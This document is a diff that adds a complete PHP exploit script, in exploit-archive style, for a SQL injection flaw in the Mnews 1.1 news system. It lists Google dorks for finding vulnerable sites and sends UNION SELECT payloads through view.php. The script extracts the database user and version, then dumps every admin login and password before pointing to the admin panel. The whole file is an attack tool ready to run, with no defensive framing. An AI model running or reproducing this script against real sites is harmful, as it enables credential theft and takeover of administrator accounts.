@@ -1,0 +1,87 @@
+?<?php
+/*
+# Exploit Title: Mnews <= 1.1 SQL Injection
+# Google Dork: inurl:mnews/view.php
+# Google Dork: intitle:"Mnews sistena de news"
+# Date: 03rd 06 2012
+# Software Link: http://phpbrasil.com/script/eo4aWVV_zFd/mnews-sistema-de-noticias
+# Version: 1.1
+# Tested on: Debian GNU/Linux,Windows 7 Ultimate
+
+Example:
+$ php mnews.php http://target.com/scripts/mnews/
+
+*/
+
+error_reporting(E_ERROR);
+set_time_limit(0);
+@ini_set("default_socket_timeout", 30);
+ 
+function hex($string){
+    $hex=''; // PHP 'Dim' =]
+    for ($i=0; $i < strlen($string); $i++){
+        $hex .= dechex(ord($string[$i]));
+    }
+    return '0x'.$hex;
+}
+
+
+echo "\nMnews <= 1.1 SQL Injection exploit\n";
+echo "Discovered and written by WhiteCollarGroup\n";
+echo "www.wcgroup.host56.com - whitecollar_group@hotmail.com\n\n";
+
+if($argc!=2) {
+	echo "Usage: \n";
+	echo "php $argv[0] <target url>\n";
+	echo "Example:\n";
+	echo "php $argv[0] http://www.website.com/mnews\n";
+	exit;
+}
+
+$target = $argv[1];
+if(substr($target, (strlen($target)-1))!="/") {
+	$target .= "/";
+}
+$inject = $target . "view.php?id=-0'%20";
+
+$token = uniqid();
+$token_hex = hex($token);
+
+echo "[*] Trying to get informations...\n";
+$infos = file_get_contents($inject.urlencode("union all select 1,concat(".$token_hex.", user(), ".$token_hex.", version(), ".$token_hex."),3,4,5-- "));
+$infos_r = array();
+preg_match_all("/$token(.*)$token(.*)$token/", $infos, $infos_r);
+$user = $infos_r[1][0];
+$version = $infos_r[2][0];
+if($user) {
+	echo "[*] MySQL version: $version\n";
+	echo "[*] MySQL user: $user\n";
+} else {
+	echo "[-] Error while getting informations.\n";
+}
+
+echo "[*] Getting users...\n";
+$i = 0;
+while(true) {
+	$dados_r = array();
+	$dados = file_get_contents($inject.urlencode("union all select 1,concat(".$token_hex.", login, ".$token_hex.", senha, ".$token_hex."),3,4,5 from admin limit $i,1-- "));
+	preg_match_all("/$token(.*)$token(.*)$token/", $dados, $dados_r);
+	$login = $dados_r[1][0];
+	$senha = $dados_r[2][0];
+	if(($login) AND ($senha)) {
+		echo "-+-\n";
+		echo "User: $login\n";
+		echo "Pass: $senha\n";
+	} else {
+		break;
+	}
+	$i++;
+}
+
+echo "-+-+-\n";
+if($i!=0) {
+	echo "[!] Admin login: {$target}gerencia/\n";
+} else {
+	echo "[-] Exploit failed. Make sure that's server is using a valid version of Mnews without Apache mod_security.\nWe're sorry.";
+}
+echo "\n";
